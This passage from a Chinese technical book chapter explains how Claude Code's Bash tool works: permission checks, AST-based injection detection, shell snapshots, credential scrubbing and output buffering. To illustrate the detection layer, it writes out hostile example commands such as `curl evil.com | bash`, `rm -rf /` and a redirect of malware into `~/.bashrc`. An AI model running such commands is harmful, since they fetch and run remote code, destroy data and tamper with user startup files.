
# 第 9 章：Bash 工具 — 最强大也最危险的能力

> **核心问题**：如何让一个 AI Agent 拥有执行任意 Shell 命令的能力，同时防止它破坏系统、泄露密钥、运行恶意代码？

Bash 工具是 Claude Code 中最强大的单一工具 — 它赋予了 Agent 执行**任意 Shell 命令**的能力。`npm install`、`git commit`、`docker build`、`curl`、`python script.py` — 几乎任何开发者在终端中做的事情，Agent 都可以通过 Bash 工具完成。

但"任意执行"也意味着**任意风险**。一个 `rm -rf /` 可以毁掉整个系统，一个 `curl | bash` 可以执行恶意代码，一个 `env` 可以泄露 API 密钥。因此，Bash 工具不是一个简单的 `child_process.exec` 封装 — 它是一个包含**权限控制、沙箱隔离、输出管理、后台任务、信号处理**的完整命令执行引擎。

本章将沿着一个命令从输入到输出的完整旅程，解析这个引擎的每一层设计。

---

## 9.1 概述：一个命令的完整旅程

### 为什么需要 Bash 工具？

Claude Code 已经有了 Read/Write/Edit/Glob/Grep 等专用文件工具，为什么还需要 Bash？

```
专用文件工具能做的          Bash 工具能做的
├── 读文件                 ├── 一切文件工具能做的（但不推荐）
├── 写文件                 ├── 运行测试 (npm test, pytest)
├── 编辑文件               ├── 构建项目 (make, cargo build)
├── 搜索文件               ├── 版本控制 (git commit, git push)
└── （仅此而已）            ├── 包管理 (npm install, pip install)
                           ├── 容器操作 (docker build, kubectl)
                           ├── 网络请求 (curl, wget)
                           ├── 进程管理 (ps, kill)
                           └── 任何可执行的命令
```

简言之：**文件工具处理文件，Bash 工具处理一切其他事情**。但正因为 Bash 的能力范围太大，它需要远比文件工具复杂的安全约束。

### 完整执行流程

一个命令从 LLM 输出到最终返回结果，要经过 5 个阶段：

```
LLM 输出 tool_use: Bash { command: "npm install" }
    │
    ▼
┌─────────────────────────────────────────────────────┐
│  1. Schema 验证                                      │
│     UE7() Zod schema 验证输入参数                     │
│     command (必填) / timeout / description /           │
│     run_in_background / dangerouslyDisableSandbox     │
└───────────────────────┬─────────────────────────────┘
                        │
    ▼
┌─────────────────────────────────────────────────────┐
│  2. 权限检查 — gc6()                                  │
│     ├─ tree-sitter AST 解析 → 命令注入检测            │
│     ├─ 沙箱自动放行判断                               │
│     ├─ 已保存 allow/deny 规则匹配                     │
│     ├─ Prompt 规则（LLM 辅助匹配）                    │
│     ├─ 子命令拆分递归检查                             │
│     └─ 默认 → 需要用户确认                            │
└───────────────────────┬─────────────────────────────┘
                        │
    ▼
┌─────────────────────────────────────────────────────┐
│  3. 命令执行 — _P1() → jLH()                         │
│     ├─ Shell 选择 (bash/zsh, 快照加载)                │
│     ├─ 命令构建 (source snapshot + eval cmd + pwd)    │
│     ├─ 沙箱包装 (sandbox-exec / bwrap)                │
│     ├─ spawn 子进程 (detached, 环境变量清理)           │
│     └─ 进度汇报 (async generator yield)               │
└───────────────────────┬─────────────────────────────┘
                        │
    ▼
┌─────────────────────────────────────────────────────┐
│  4. 输出管理                                          │
│     ├─ 内存缓冲 (< 8MB) → 溢出写磁盘                  │
│     ├─ 环形缓冲区 (最近 1000 行)                       │
│     ├─ 超时 → 自动后台化 / 强制 kill                   │
│     └─ 大文件持久化 (硬链接到 tool-results)            │
└───────────────────────┬─────────────────────────────┘
                        │
    ▼
┌─────────────────────────────────────────────────────┐
│  5. 结果处理与返回                                     │
│     ├─ 输出清理 (去空行) + 安全提示提取                │
│     ├─ 图片数据检测 (data:image/... base64)           │
│     ├─ 退出码解释 (MR7)                               │
│     ├─ CWD 更新 (读取 pwd 输出文件)                    │
│     └─ 返回 { stdout, stderr, code, ... }            │
└─────────────────────────────────────────────────────┘
```

### Input Schema

Bash 工具的输入 Schema 由 `UE7()` 定义，包含 5 个参数：

```javascript
{
    command: string,                    // 要执行的 Shell 命令（必填）
    timeout: number?,                   // 超时毫秒数（最大 600000 = 10 分钟）
    description: string?,              // 命令描述（给用户看的）
    run_in_background: boolean?,       // 是否在后台执行
    dangerouslyDisableSandbox: boolean? // 是否禁用沙箱（需要权限）
}
```

> **设计决策**：Bash 工具的 `validateInput` 直接返回 `{ result: true }` — 不做任何输入验证。这与 Edit 工具的 9 步验证形成鲜明对比。原因是 Bash 的"合法性"不在输入层判断，而是由 `checkPermissions`（gc6）全权负责。命令是否安全，需要 AST 解析、规则匹配、沙箱判断等复杂逻辑，远超简单的输入验证范畴。

### 内部 vs 外部 Schema

一个有趣的细节：Bash 工具有**两层 Schema**：

```javascript
FE7 = h.strictObject({
    command, timeout, description, run_in_background,
    dangerouslyDisableSandbox,
    _simulatedSedEdit: h.object({       // 内部隐藏参数
        filePath: h.string(),
        newContent: h.string()
    }).optional()
});

// 外部 Schema 移除内部参数
UE7 = FE7().omit({ _simulatedSedEdit: true });
```

`_simulatedSedEdit` 是一个**对 LLM 不可见**的内部参数。当 LLM 发送 `sed` 命令时，CC 可能先在内部模拟 sed 的执行结果，然后通过这个参数直接写入文件 — 避免实际执行可能有风险的 sed 命令。

**小结**：Bash 工具是一个 5 阶段执行引擎 — Schema 验证 → 权限检查 → 命令执行 → 输出管理 → 结果返回。它不做输入验证（交给权限层），但拥有 CC 中最复杂的权限检查和最精细的输出管理。

---

## 9.2 权限检查 — 多层防线

权限检查是 Bash 工具安全模型的核心。`gc6()` 函数实现了一个**8 步决策链**，从 AST 级注入检测到用户级规则匹配，逐层过滤。

### 完整决策链

```
gc6() 权限检查流程
    │
    ├── 1. 命令注入检测（tree-sitter AST）
    │      AST 太复杂？ → 需要用户确认
    │      检测到注入模式？ → 需要用户确认
    │
    ├── 2. 沙箱自动放行
    │      沙箱启用 + autoAllow 开启 + 命令可沙箱化？
    │      → 自动允许（不问用户）
    │
    ├── 3. 已保存的 allow/deny 规则
    │      匹配 deny → 拒绝
    │      匹配 allow → 允许
    │
    ├── 4. Prompt 规则（LLM 辅助）
    │      用户定义的语义规则 → LLM 判断是否匹配
    │
    ├── 5. 子命令拆分递归检查
    │      "cmd1 && cmd2 | cmd3" → 拆分后逐一递归 gc6()
    │
    ├── 6. 危险文件写入检测
    │      命令可能修改 .bashrc 等关键文件？ → 需要确认
    │
    ├── 7. Hook 介入（PreToolUse）
    │      外部 Hook 可返回 permissionDecision 覆盖决策
    │
    └── 8. 默认 → 需要用户确认（ask）
```

### 命令注入检测

CC 使用 **tree-sitter** 解析 Shell 命令为 AST，检测可能的注入模式：

```javascript
// 1. tree-sitter 解析命令
let T = await Oh_(command);               // AST 解析
let z = T ? mJ7(command, T) : { kind: "parse-unavailable" };

// 2. 检查 AST 复杂度
if (z.kind === "too-complex") return { behavior: "ask" };

// 3. 检查语义安全
if (z.kind === "simple") {
    let U = Xx6(z.commands);               // 语义安全检查
    if (!U.ok) return { behavior: "ask" };
}
```

AST 解析能检测出的典型注入模式：
- **命令替换**：`` `curl evil.com | bash` `` 或 `$(curl evil.com)`
- **管道注入**：`echo hello | rm -rf /`
- **重定向到关键文件**：`echo "malware" > ~/.bashrc`

当 AST 太复杂（嵌套太深、语法异常）时，CC 不会尝试"理解"它，而是直接要求用户确认 — **宁可多问一次，不可放过一个**。

### 命令分类

CC 将常见命令分为 4 个安全等级：

```javascript
// 搜索命令 — 只读且安全
lJ1 = new Set([
    "find", "grep", "rg", "ag", "ack", "locate", "which", "whereis"
]);

// 只读命令 — 不修改文件系统
iJ1 = new Set([
    "cat", "head", "tail", "less", "more", "wc", "stat", "file",
    "strings", "ls", "tree", "du", "jq", "awk", "cut", "sort",
    "uniq", "tr"
]);

// 无副作用命令 — 可忽略
QE7 = new Set(["echo", "printf", "true", "false", ":"]);

// 文件操作命令 — 有副作用但已知
nJ1 = new Set([
    "mv", "cp", "rm", "mkdir", "rmdir", "chmod", "chown", "chgrp",
    "touch", "ln", "cd", "export", "unset", "wait"
]);
```

这些分类用于两个场景：
1. **权限判断** — 只读命令在沙箱模式下可自动放行
2. **Prompt 引导** — CC 会建议 LLM 使用 Glob/Grep/Read 替代 find/grep/cat

### 子命令拆分递归检查

当命令包含管道、`&&`、`;` 等组合符时，CC 会**拆分**后递归检查每个子命令：

```javascript
let j = await iE7(command, (subCmd) => gc6(subCmd, context, roH), { ... });
```

比如 `ls -la && rm -rf /tmp`：
- `ls -la` → 只读，允许
- `rm -rf /tmp` → 危险，需要确认
- 最终结果：需要确认（取最严格的子结果）

> **设计决策**：权限检查的默认行为是 `ask`（需要用户确认），而非 `allow` 或 `deny`。这体现了"默认安全"原则 — 如果 CC 不确定一个命令是否安全，就问用户。唯一的自动允许路径是沙箱模式下的白名单命令。

**小结**：Bash 的权限检查是一个 8 层过滤器，从 AST 注入检测到用户规则匹配逐层过滤。默认行为是"问用户"，自动允许只在沙箱+白名单条件下发生。子命令递归检查确保了复合命令的每个部分都被审查。

---

## 9.3 命令执行引擎

通过权限检查后，命令进入执行阶段。这是 Bash 工具中**工程复杂度最高**的部分 — 需要处理 Shell 选择、命令构建、沙箱包装、进程管理、进度汇报等多个维度。

### _P1()：异步生成器设计

执行入口 `_P1()` 是一个**异步生成器函数**（`async function*`），这个设计是 Bash 工具进度汇报的基础：

```javascript
async function* _P1({ input, abortController, ... }) {
    let { command, timeout, run_in_background } = input;
    let defaultTimeout = timeout || 120000;     // 默认 2 分钟

    // 启动子进程
    let process = await jLH(command, abortController.signal, "bash", {
        timeout: defaultTimeout,
        onProgress(stdout, stderr, elapsed, lines, bytes) { ... },
        shouldUseSandbox: vC(input),
        shouldAutoBackground: !isDisabled && notSleepCommand(command)
    });

    // 显式后台执行 → 立即返回
    if (run_in_background === true) {
        let taskId = await createBackgroundTask();
        return { stdout: "", stderr: "", code: 0, backgroundTaskId: taskId };
    }

    // 主循环：等待完成或汇报进度
    while (true) {
        let result = await Promise.race([process.result, progressPromise]);
        if (result !== null) break;   // 命令完成

        // ⭐ 通过 yield 返回进度（调用方通过迭代器消费）
        yield {
            type: "progress",
            output: currentOutput,
            elapsedTimeSeconds: elapsed,
            totalLines: lineCount,
            totalBytes: byteCount
        };
    }
}
```

> **设计决策**：为什么用异步生成器而非回调或 EventEmitter？生成器天然支持**背压控制** — 如果调用方还没准备好消费下一个进度更新，`yield` 会自动暂停执行。回调/事件模式下，高频进度更新可能导致事件洪泛。此外，生成器的 `for await...of` 语法让调用方代码更清晰。

### jLH()：子进程启动全流程

`jLH()` 是实际创建子进程的核心函数：

```
jLH() 执行流程
    │
    ├── 1. 获取 Shell Provider
    │      C31["bash"]() → sW7() → 返回 bash/zsh provider
    │
    ├── 2. 构建命令字符串（buildExecCommand）
    │      source 快照 + 注入 rg 别名 + 禁用 extglob
    │      + eval 用户命令 + pwd -P 保存 CWD
    │      → 最终命令："source snapshot && eval 'npm install' && pwd -P >| /tmp/cwd"
    │
    ├── 3. 验证工作目录
    │      CWD 不存在？→ 回退到项目根目录
    │
    ├── 4. 沙箱包装
    │      shouldUseSandbox? → wrapWithSandbox() 包装命令
    │      创建沙箱临时目录（0700 权限）
    │
    ├── 5. spawn 子进程
    │      env: { ...Lx(), GIT_EDITOR:"true", CLAUDECODE:"1" }
    │      detached: true（独立进程组）
    │      stdio: pipe / 直接写文件（取决于模式）
    │
    ├── 6. 创建进程管理器 D48
    │      管理超时、后台化、信号处理
    │
    └── 7. 命令完成后更新 CWD
           读取 pwd 输出文件 → 更新内部 CWD 状态
```

最终发送给 Shell 执行的命令不是用户的原始命令，而是一个**包装后的命令链**：

```bash
# 实际执行的命令（简化版）
source ~/.claude/shell-snapshots/snapshot-zsh-xxx.sh 2>/dev/null || true \
  && shopt -u extglob 2>/dev/null || true \
  && eval 'npm install' \
  && pwd -P >| /tmp/claude-xxx-cwd
```

### CWD 追踪

由于每个命令是独立的 `spawn` 进程，命令中的 `cd` 不会影响 CC 的内部工作目录。CC 的解决方案很巧妙 — 在每个命令末尾附加 `pwd -P >| tmpfile`：

```javascript
// 命令构建时追加
P.push(`eval ${quotedCommand}`);
P.push(`pwd -P >| ${cwdFilePath}`);    // 保存命令执行后的 CWD

// 命令完成后读取
process.result.then(async (result) => {
    let newCwd = fs.readFileSync(cwdFilePath, "utf8").trim();
    if (newCwd.normalize("NFC") !== currentCwd) {
        updateCwd(newCwd);              // 更新内部 CWD
    }
});
```

> **设计决策**：通过文件传递 CWD 是无状态进程模型下的巧妙方案。相比维护一个持久 Shell 会话（复杂且容易泄露状态），独立进程 + 文件通信更安全、更可预测。代价是每个命令多一次文件 I/O，但与命令本身的执行时间相比微不足道。

**小结**：命令执行引擎通过异步生成器实现流式进度汇报，通过命令包装实现 Shell 环境恢复和 CWD 追踪，通过 D48 进程管理器控制超时和信号。每个命令都是独立进程，不共享 Shell 状态。

---

## 9.4 Shell 环境管理

Bash 工具的每个命令都在一个**全新的 Shell 进程**中执行，不共享任何状态。但用户期望命令能"感知"他们的 Shell 环境（别名、函数、环境变量）。CC 通过 Shell 检测、快照系统和环境变量管理三个机制解决了这个矛盾。

### Shell 检测与优先级

CC 支持 `bash` 和 `zsh` 两种 Shell（Windows 上使用 PowerShell，本章聚焦 Unix）。Shell 选择遵循一个优先级链：

```javascript
async function y31() {
    // 1. 最高优先级：CLAUDE_CODE_SHELL 环境变量
    let override = process.env.CLAUDE_CODE_SHELL;
    if (override && isValidShell(override)) return override;

    // 2. 系统默认 SHELL
    let systemShell = process.env.SHELL;
    let isValid = systemShell?.includes("bash") || systemShell?.includes("zsh");

    // 3. 在标准路径中搜索 zsh/bash
    let [hasZsh, hasBash] = await Promise.all([which("zsh"), which("bash")]);
    let searchOrder = systemShell?.includes("bash")
        ? ["bash", "zsh"]    // 系统默认 bash → bash 优先
        : ["zsh", "bash"];   // 否则 zsh 优先

    let paths = ["/bin", "/usr/bin", "/usr/local/bin", "/opt/homebrew/bin"];
    let candidates = searchOrder.flatMap(sh => paths.map(p => `${p}/${sh}`));

    // 系统默认 shell 放到最前
    if (isValid) candidates.unshift(systemShell);

    return candidates.find(isExecutable);
}
```

> **设计决策**：为什么 zsh 默认优先于 bash？因为 macOS 从 Catalina 起默认 Shell 改为 zsh，CC 的大量用户在 macOS 上使用。但如果用户的系统默认是 bash，则尊重用户选择。

### 环境传递全景：三层方案

子进程如何获得"和用户终端一样"的环境？这个看似简单的问题在 Agent 场景下变得复杂——CC 每执行一条命令都会 `spawn` 一个独立的 Shell 进程，该进程默认什么都不知道（没有用户的 PATH 修改、没有 nvm、没有 pyenv）。CC 通过**三层方案**解决这个问题：

```
CC 主进程 (Node.js)
│
│  process.env = { PATH, HOME, ANTHROPIC_API_KEY, NVM_DIR, ... }
│
▼
┌──────────────────────────────────────────────────────────────┐
│  第 1 层：Lx() — process.env 显式传递 + 敏感变量清理          │
│                                                              │
│  let env = { ...process.env };    // 复制父进程所有环境变量    │
│  delete env.ANTHROPIC_API_KEY;    // 删除 API 密钥           │
│  delete env.AWS_SECRET_ACCESS_KEY;// 删除云凭证               │
│  ...                                                         │
└──────────────────────────┬───────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│  第 2 层：spawn({ env }) — 注入控制变量                       │
│                                                              │
│  child_process.spawn(shell, args, {                          │
│    env: {                                                    │
│      ...Lx(),               // 第 1 层的结果                  │
│      GIT_EDITOR: "true",    // 防止 git 打开编辑器            │
│      CLAUDECODE: "1",       // 标识 CC 环境                  │
│      TMPDIR: sandboxTmpDir, // 沙箱临时目录                   │
│      ...providerOverrides   // Shell provider 额外覆盖       │
│    }                                                         │
│  });                                                         │
└──────────────────────────┬───────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│  第 3 层：Shell 快照 source — 恢复用户 rc 文件的效果          │
│                                                              │
│  实际执行的命令拼接：                                          │
│  bash -c "                                                   │
│    source ~/.claude/shell-snapshots/snapshot-bash-xxx.sh &&   │
│    shopt -u extglob 2>/dev/null || true &&                   │
│    eval 'user_command' &&                                    │
│    pwd -P >| /tmp/cwd_file                                   │
│  "                                                           │
│                                                              │
│  快照 = rc 文件执行后的"结果快照"（export/alias/function）    │
└──────────────────────────────────────────────────────────────┘
```

一个关键细节：Node.js 的 `child_process.spawn` 如果传了 `env` 选项，子进程**只继承你传的这个对象**，不会自动继承 `process.env`。所以 `...Lx()` 展开是必须的——它把父进程的环境变量显式传递给子进程，同时剥离敏感凭证。

这三层的分工很清晰：第 1 层负责"继承 + 安全"，第 2 层负责"Agent 控制"，第 3 层负责"用户习惯"。下面逐层展开。

### Shell 快照系统

快照是 CC 避免"Shell 冷启动"的关键优化。没有快照，每个命令都需要执行完整的 login Shell 初始化（加载 `.bashrc`/`.zshrc`），可能耗时数秒。

```
快照创建流程 (BW7)
    │
    ├── 1. 启动一个 login shell（bash -c -l 或 zsh -c -l）
    ├── 2. 完整执行 rc 初始化链
    │      ├── bash: /etc/profile → ~/.bash_profile → ~/.bashrc
    │      └── zsh:  /etc/zshenv → ~/.zshenv → ~/.zprofile → ~/.zshrc → ~/.zlogin
    ├── 3. 捕获求值后的结果：
    │      ├── 环境变量 (export -p)
    │      ├── Shell 函数 (typeset -f / declare -f)
    │      ├── 别名 (alias)
    │      └── Shell 选项
    ├── 4. 写入快照文件 ~/.claude/shell-snapshots/snapshot-zsh-xxx.sh
    └── 5. 超时保护：10 秒（rc 文件太慢则放弃）
```

快照文件的内容是**纯粹的声明语句**，没有任何条件逻辑或外部调用：

```bash
# ~/.claude/shell-snapshots/snapshot-bash-a1b2c3.sh
# ── 这不是 rc 文件的副本，而是 rc 文件执行后的"结果快照" ──
export PATH="/usr/local/bin:/usr/bin:/bin:/home/user/.nvm/versions/node/v20/bin"
export NVM_DIR="/home/user/.nvm"
export GOPATH="/home/user/go"
export PYENV_ROOT="/home/user/.pyenv"
alias ll='ls -la'
alias gs='git status'
myfunc() { ... }
```

后续命令只需要 `source snapshot.sh`（2-5ms），而不是重新执行完整的 login 初始化（50-500ms）。

```javascript
// Shell Provider 的命令构建 (sW7.buildExecCommand)
async buildExecCommand(command, options) {
    let snapshot = await getSnapshot();     // 获取快照（首次会创建）
    let parts = [];

    if (snapshot) parts.push(`source ${quote(snapshot)} 2>/dev/null || true`);
    // ... 其他初始化（ripgrep 别名、extglob 禁用）
    parts.push(`eval ${quote(command)}`);
    parts.push(`pwd -P >| ${cwdFile}`);

    return { commandString: parts.join(" && "), cwdFilePath: cwdFile };
}

// spawn 参数：有快照跳过 -l，无快照走 login shell
getSpawnArgs(command) {
    let hasSnapshot = snapshot !== undefined;
    if (hasSnapshot) log("Spawning shell without login (-l flag skipped)");
    return ["-c", ...hasSnapshot ? [] : ["-l"], command]
    // 有快照:  bash -c "source snapshot && ... && eval cmd"
    // 无快照:  bash -c -l "eval cmd"     ← 仅首次或快照失败时
}
```

> **设计决策**：有快照时跳过 login shell 的 `-l` 标志 — `bash -c "..."` 而非 `bash -c -l "..."`。快照已经包含了 rc 文件的效果，再走 login 初始化不仅冗余，还可能导致变量重复定义、PATH 重复追加等问题。

#### 为什么不直接每次 `bash -lc`？

一个自然的疑问：为什么不省去快照系统的复杂度，直接每次 `bash -lc "command"` 让 Shell 自己初始化？CC 选择快照方案而非 `bash -lc` 有五个原因：

**① 性能：rc 文件的初始化开销不可接受**

```
bash -lc 每次都要执行：
  /etc/profile                    ~5ms
  ~/.bash_profile                 ~2ms
  ~/.bashrc                       ~10-100ms
    ├── nvm init                  ~50ms     ← Node 版本管理
    ├── conda init                ~30ms     ← Python 环境
    ├── pyenv init                ~20ms
    ├── rbenv init                ~15ms
    └── oh-my-zsh (zsh 用户)      ~100-300ms
  ─────────────────────────────────────
  总计：50-500ms × 每条命令

快照方式：
  source snapshot.sh              ~2-5ms × 每条命令
```

一个 agentic loop 可能执行几十甚至上百次 Bash 命令。如果每次都走 `bash -lc`，仅初始化就要浪费 **5-50 秒**。

**② 副作用：rc 文件不是幂等的**

用户的 `.bashrc` / `.zshrc` 里常有非幂等操作：

```bash
# PATH 重复追加 — 每次 source PATH 都变长
export PATH="$HOME/.local/bin:$PATH"

# 打印信息 — 会混入命令输出，干扰 LLM 解析
echo "Welcome to $(hostname)!"
fortune | cowsay

# 启动后台服务 — 每次执行都会多启动一个
eval "$(ssh-agent -s)"

# 交互式检查 — 可能导致进程 hang
[[ -z "$TMUX" ]] && exec tmux
```

`bash -lc` 每次执行都会触发这些代码。而**快照只在创建时执行一次**，之后 source 的是求值后的纯声明结果，不会重复触发副作用。

**③ 可控性：快照是只读的纯数据**

```
bash -lc 执行的是：                    快照 source 的是：
──────────────────                    ────────────────
用户的 rc 文件（任意代码）             静态 .sh 文件（只有 export/alias/function）
可能 hang、可能报错、可能改 stdout    没有条件逻辑，没有外部调用
不确定性执行                          确定性执行，不会 hang
```

**④ 安全：减少攻击面**

每次 `bash -lc` 都会执行 `/etc/profile` 和用户的 rc 文件。如果这些文件被恶意修改（供应链攻击、恶意 npm 包修改 `.bashrc`），每次 Bash 命令都会触发恶意代码。快照方案把这个风险窗口限制在**首次创建快照的那一次**。

**⑤ 跨 Shell 一致性**

bash 和 zsh 的 login 初始化路径完全不同：

```
bash -l:  /etc/profile → ~/.bash_profile → (~/.bashrc)           3 个文件
zsh  -l:  /etc/zshenv → ~/.zshenv → ~/.zprofile → ~/.zshrc → ... 6 个文件
```

zsh 的初始化链特别长。快照系统让两种 Shell 最终都归结为一次 `source snapshot.sh`，行为统一。

| 维度 | 每次 `bash -lc` | 快照 + `bash -c` |
|------|-----------------|-------------------|
| **性能** | 50-500ms/次 | 2-5ms/次 |
| **副作用** | 每次触发 rc 中的非幂等代码 | 只在首次创建时触发一次 |
| **可控性** | 执行任意用户代码，不可预测 | source 纯声明文件，确定性 |
| **安全性** | 每次都执行 rc，攻击面大 | 只首次执行，风险窗口小 |
| **跨 Shell** | bash/zsh 初始化路径不同 | 统一为 source snapshot |
| **降级** | — | 快照失败时回退到 `-lc` |

> **设计决策**：这个方案的本质是 **"一次 login，终身复用"** — 首次付出完整 login shell 的代价创建快照，之后每次只付 `source` 的代价。在 Agent 场景下（一个会话执行上百次命令），这是性能和可靠性的最优解。快照创建有 10 秒超时保护，失败时静默回退到 `bash -lc`，确保零风险降级。

### 环境变量继承与清理

理解了三层方案的整体架构后，我们来看第 1 层（`Lx()` 清理）和第 2 层（`spawn` 注入）的具体实现。

**第 1 层：`Lx()` — 继承父进程 env 并清理敏感变量**

```javascript
function Lx() {
    // 未启用清理 → 直接继承
    if (!isEnabled("CLAUDE_CODE_SUBPROCESS_ENV_SCRUB"))
        return process.env;

    // 启用清理 → 复制 + 删除敏感变量
    let env = { ...process.env };
    for (let key of D31) {
        delete env[key];
        delete env[`INPUT_${key}`];    // GitHub Actions 前缀变体
    }
    return env;
}
```

被清理的敏感变量包括：

| 类别 | 变量 |
|------|------|
| **Anthropic 凭证** | `ANTHROPIC_API_KEY`, `CLAUDE_CODE_OAUTH_TOKEN`, `ANTHROPIC_AUTH_TOKEN` |
| **云服务凭证** | `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`, `AZURE_CLIENT_SECRET` |
| **CI/CD 令牌** | `ACTIONS_ID_TOKEN_REQUEST_TOKEN`, `ACTIONS_RUNTIME_TOKEN` |
| **其他敏感** | `SSH_SIGNING_KEY`, `GOOGLE_APPLICATION_CREDENTIALS` |

**第 2 层：spawn 时的完整 env 构造**

```javascript
// jLH() 子进程启动
let child = child_process.spawn(shellPath, spawnArgs, {
    env: {
        ...Lx(),                       // 第 1 层：父进程 env（已清理敏感变量）
        SHELL: shellPath,              // 覆盖 SHELL 为实际使用的 shell
        GIT_EDITOR: "true",            // 防止 git 打开编辑器（阻塞 Agent）
        CLAUDECODE: "1",               // 标识 CC 环境（用户脚本可检测）
        ...providerOverrides           // Shell provider 的额外覆盖
    },
    cwd: workingDir,
    detached: true                     // 独立进程组（便于 tree-kill）
});
```

注入的控制变量各有其工程理由：

| 变量 | 值 | 为什么需要 |
|------|------|------|
| `GIT_EDITOR` | `"true"` | `git commit`（无 `-m`）、`git rebase -i` 等会打开编辑器，编辑器等待人的输入会导致进程永久 hang。设为 `true`（一个什么都不做就返回成功的命令）让这些操作静默通过 |
| `CLAUDECODE` | `"1"` | 用户的脚本和 CI 可以通过 `if [ "$CLAUDECODE" = "1" ]` 检测是否在 CC 环境中运行，做差异化处理 |
| `TMPDIR` | 沙箱临时目录 | 沙箱模式下，将临时文件重定向到沙箱允许写入的目录内，防止程序通过 `/tmp` 逃逸沙箱的文件系统限制 |

### 安全措施：禁用 extglob

CC 在每个命令前注入 extglob 禁用指令：

```javascript
function k31(shellPath) {
    if (shellPath.includes("bash"))
        return "shopt -u extglob 2>/dev/null || true";
    else if (shellPath.includes("zsh"))
        return "setopt NO_EXTENDED_GLOB 2>/dev/null || true";
    return null;
}
```

扩展 glob 模式（如 `!(pattern)`、`@(pattern)`）可能导致 Shell 意外展开用户命令中的特殊字符，引发安全问题。禁用它是一个预防性措施。

**小结**：Shell 环境管理通过**三层方案**解决了"独立进程 vs 环境一致性"的矛盾：`Lx()` 显式传递父进程 env 并清理敏感凭证（第 1 层）、spawn 注入 Agent 控制变量（第 2 层）、Shell 快照恢复用户的 rc 文件效果（第 3 层）。这个方案的核心洞察是**不走 `bash -lc`**——每次 login 初始化的性能开销（50-500ms）、非幂等副作用（PATH 重复、输出污染）、和安全风险在 Agent 场景下都不可接受。"一次 login，终身复用"的快照方案把这些代价压缩到首次执行的一次性开销，同时保留了失败回退到 `-lc` 的安全降级路径。

---

## 9.5 输出管理 — 三层缓冲架构

Bash 命令的输出可能是几个字节（`echo hello`），也可能是几 GB（`npm install --verbose`、`find /`）。CC 设计了一个**三层缓冲架构**来应对这个跨越六个数量级的输出范围。

### 三层架构总览

```
命令输出 (可能几 MB 甚至几 GB)
    │
    ▼
┌─────────────────────────────────────────┐
│  第 1 层：内存缓冲（QT 类）              │
│  ├── stdout/stderr 字符串累加            │
│  ├── 环形缓冲区保留最近 1000 行          │
│  └── 上限 8MB → 超出后溢出到第 2 层      │
└───────────────────┬─────────────────────┘
                    │ 溢出
    ▼
┌─────────────────────────────────────────┐
│  第 2 层：磁盘文件（Gy_ 写入器）          │
│  ├── 输出重定向到临时文件                 │
│  ├── 持久化上限 64MB → 超出截断           │
│  └── 后台任务上限 5GB → 超出 kill 进程    │
└───────────────────┬─────────────────────┘
                    │ 返回给 LLM
    ▼
┌─────────────────────────────────────────┐
│  第 3 层：截断返回                        │
│  ├── 最大 150K 字符发给 LLM               │
│  ├── 溢出时：最近 5 行 + 文件引用          │
│  └── 完整数据通过文件路径访问             │
└─────────────────────────────────────────┘
```

### TaskOutput (QT) 类

`QT` 是输出管理的核心类，封装了三层缓冲的全部逻辑：

```javascript
class QT {
    taskId;                             // 任务 ID
    path;                               // 输出文件路径
    #stdout = "";                       // stdout 内存缓冲
    #stderr = "";                       // stderr 内存缓冲
    #spillWriter = null;                // 磁盘溢出写入器 (Gy_)
    #ringBuffer = new FnH(1000);        // 环形缓冲区（最近 1000 行）
    #maxMemory = 8388608;               // 8MB 内存上限

    writeStdout(data) { this.#write(data, false); }
    writeStderr(data) { this.#write(data, true); }

    #write(data, isStderr) {
        this.#totalBytes += data.length;
        this.#ringBuffer.push(data);     // 始终更新环形缓冲

        // 超过内存上限 → 溢出到磁盘
        if (this.#stdout.length + this.#stderr.length + data.length > this.#maxMemory) {
            this.#spillToDisk(data, isStderr);
            return;
        }

        if (isStderr) this.#stderr += data;
        else this.#stdout += data;
    }

    // 获取输出（可能从文件读取）
    async getStdout() {
        if (this.#spillWriter) {
            // 输出已溢出 → 返回最近 5 行 + 文件引用
            let recent = this.#ringBuffer.getRecent(5);
            return `${recent}\nOutput truncated (${kb}KB total). Full output saved to: ${this.path}`;
        }
        return this.#stdout;
    }
}
```

环形缓冲区是一个值得关注的设计 — 即使输出已经溢出到磁盘，CC 仍然在内存中保留**最近 1000 行**用于进度展示和截断返回。这避免了频繁的磁盘读取。

### 输出后处理链

命令完成后，输出经过一个 4 步处理链：

```
原始输出
    │
    ├── 1. nE_() — 去除首尾空行和多余空白
    │
    ├── 2. mnH() — 提取安全相关的 hints
    │      （如 "npm WARN" 等安全提示）
    │
    ├── 3. boH() — 检测 base64 图片数据
    │      （data:image/png;base64,... → 作为 image block 返回）
    │
    └── 4. 沙箱失败标注
           （沙箱导致的权限错误 → 添加注释）
```

图片检测是一个有趣的特性 — 如果命令输出中包含 `data:image/...` 格式的 base64 数据（比如 `tty-screenshot` 命令的输出），CC 会将其提取为 image content block，让 LLM 直接"看到"这张图。

### 关键常量

| 常量 | 值 | 含义 |
|------|------|------|
| 内存缓冲上限 | 8 MB (`q31`) | 超过后溢出到磁盘 |
| 输出截断阈值 | 150,000 字符 (`Dm6`) | 返回给 LLM 的最大长度 |
| 截断最小值 | 30,000 字符 (`jm6`) | 用户配置的下限 |
| 持久化文件上限 | 64 MB | 持久化输出文件的截断点 |
| 后台任务文件上限 | 5 GB (`bi_`) | 超过后强制 kill 进程 |
| 环形缓冲区 | 1,000 行 | 保留最近输出 |

**小结**：三层缓冲架构（内存 → 磁盘 → 截断）确保了短命令快速返回、长输出不撑爆内存、LLM 只看到有用的尾部输出。环形缓冲区在溢出后仍保留最近 1000 行，是"快速访问 vs 内存限制"的精巧平衡。

---

## 9.6 超时与后台任务

Bash 命令的执行时间不可预测 — `echo hello` 毫秒完成，`npm install` 可能数分钟，`docker build` 可能半小时。CC 通过**超时控制**和**后台任务系统**来应对这种不确定性。

### 超时控制三层结构

```
超时控制层级
    │
    ├── 用户层：timeout 参数
    │     └── 最大 600,000 ms（10 分钟），由 fC_() 限制
    │
    ├── 默认层：QkH()
    │     └── 120,000 ms（2 分钟），可通过 BASH_DEFAULT_TIMEOUT_MS 覆盖
    │
    └── 绝对上限：h31
          └── 1,800,000 ms（30 分钟），jLH() 层面的硬上限
```

```javascript
// 默认超时
function QkH() {
    let env = process.env.BASH_DEFAULT_TIMEOUT_MS;
